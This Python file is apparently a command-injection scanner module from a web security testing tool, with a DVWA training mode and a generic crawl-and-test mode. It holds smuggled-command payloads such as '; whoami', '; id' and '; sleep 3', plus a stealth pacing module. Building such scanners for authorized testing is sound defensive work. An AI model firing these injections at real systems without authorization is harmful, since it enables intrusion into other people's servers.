# scanners/cmdi_scanner.py
import requests, time
from bs4 import BeautifulSoup
from core.web_crawler import WebCrawler
from llm.payload_generator import LLMPayloadGenerator
from core.authorization import AuthorizationChecker
from core.stealth import stealth
class CMDiScanner:
    DVWA_PATHS = ["/vulnerabilities/exec/"]
    
    def __init__(self, target_url, session=None):
        self.target_url = target_url.rstrip("/")
        self.session = session or requests.Session()
        self.payload_gen = LLMPayloadGenerator()
        self.auth = AuthorizationChecker()
        self.findings = []
        self.is_dvwa = "dvwa" in target_url.lower()
        self._crawler = None
        self._pre_crawled = False
        self.session.headers.update({"User-Agent": "Mozilla/5.0 (Security Scanner - Authorized Testing)"})
        self.linux_patterns  = ["root:","daemon:","uid=","gid=","linux","ubuntu","kali"]
        self.windows_patterns = ["windows","microsoft","system32","nt authority","program files"]
        self.direct_payloads = ["; whoami","& whoami","| whoami","&& whoami","; id","| id","& dir","; uname -a"]
        self.time_payloads   = ["; sleep 3","& ping -n 4 127.0.0.1","| sleep 3"]

    def get_token(self, url):
        try:
            stealth.wait()
            r = self.session.get(url, timeout=10)
            soup = BeautifulSoup(r.text, "html.parser")
            t = soup.find("input", {"name": "user_token"})
            return t["value"] if t else ""
        except: return ""

    def check_output(self, r):
        if not r: return False, None
        t = r.text.lower()
        for p in self.linux_patterns + self.windows_patterns:
            if p in t: return True, p
        return False, None

    def _scan_dvwa(self):
        print("[CMDi] DVWA mode")
        dvwa_direct = ["127.0.0.1; whoami","127.0.0.1 && whoami","127.0.0.1 | whoami","127.0.0.1; id","127.0.0.1 & whoami","127.0.0.1 & dir"]
        dvwa_time   = ["127.0.0.1; sleep 3","127.0.0.1 && sleep 3","127.0.0.1 & ping -n 4 127.0.0.1"]
        for path in self.DVWA_PATHS:
            url = self.target_url + path
            for payload in dvwa_direct:
                token = self.get_token(url)
                stealth.wait()
                r = self.session.post(url, data={"ip": payload, "Submit": "Submit", "user_token": token}, timeout=15)
                vuln, pattern = self.check_output(r)
                if vuln:
                    self.findings.append({"type": "Command Injection - Direct", "url": url, "parameter": "ip", "payload": payload, "severity": "Critical", "evidence": f"Command output: '{pattern}'"})
                    print(f"[CMDi] ✅ Direct!"); break
            print("[CMDi] Time-based test (~3s)...")
            for payload in dvwa_time:
                token = self.get_token(url)
                start = time.time()
                stealth.wait()
                self.session.post(url, data={"ip": payload, "Submit": "Submit", "user_token": token}, timeout=15)
                if time.time() - start >= 3:
                    self.findings.append({"type": "Command Injection - Time Based Blind", "url": url, "parameter": "ip", "payload": payload, "severity": "Critical", "evidence": f"Delayed {round(time.time()-start,2)}s"})
                    print(f"[CMDi] ✅ Time-Based!"); break

    def _test_endpoint(self, get_fn, param_name, endpoint_url):
        for payload in self.direct_payloads:
            r = get_fn(payload)
            vuln, pattern = self.check_output(r)
            if vuln:
                self.findings.append({"type": "Command Injection - Direct", "url": endpoint_url, "parameter": param_name, "payload": payload, "severity": "Critical", "evidence": f"Command output: '{pattern}'"})
                print(f"[CMDi] ✅ Direct! Param: {param_name}"); return
        print(f"[CMDi] Time-based on '{param_name}' (~3s)...")
        for payload in self.time_payloads:
            start = time.time()
            get_fn(payload)
            if time.time() - start >= 3:
                self.findings.append({"type": "Command Injection - Time Based Blind", "url": endpoint_url, "parameter": param_name, "payload": payload, "severity": "Critical", "evidence": f"Delayed {round(time.time()-start,2)}s"})
                print(f"[CMDi] ✅ Time-Based! Param: {param_name}"); return

    def _scan_generic(self):
        print("[CMDi] Generic mode")
        if self._pre_crawled and self._crawler:
            crawler = self._crawler
            forms = crawler.forms_found
            url_params = crawler.url_params_found
        else:
            crawler = WebCrawler(self.target_url, self.session, max_pages=15)
            crawler.crawl()
            forms = crawler.forms_found
            url_params = crawler.url_params_found

        print(f"[CMDi] {len(forms)} forms, {len(url_params)} URL param endpoints")

        tested = set()
        for form in forms:
            action = form["action_url"]
            if action in tested: continue
            tested.add(action)
            text_params = [i["name"] for i in form["inputs"] if i["type"] in ["text","search","number","url","textarea"]]
            for param in text_params:
                self._test_endpoint(lambda p, f=form, pn=param: crawler.submit_form(f, p, target_param=pn), param, action)

        tested_bases = set()
        for up in url_params:
            base = up["base_url"]
            if base in tested_bases: continue
            tested_bases.add(base)
            for param_name in up["params"]:
                self._test_endpoint(lambda p, u=up, pn=param_name: crawler.test_url_param(u, p, pn), param_name, base)

    def scan(self):
        if not self.auth.check_authorization(self.target_url):
            print("[CMDi] ❌ Unauthorized!"); return []
        print(f"\n[CMDi] 🔍 Scanning: {self.target_url}")
        if self.is_dvwa: self._scan_dvwa()
        else: self._scan_generic()
        print(f"\n[CMDi] Done. Found {len(self.findings)} finding(s).")
        return self.findings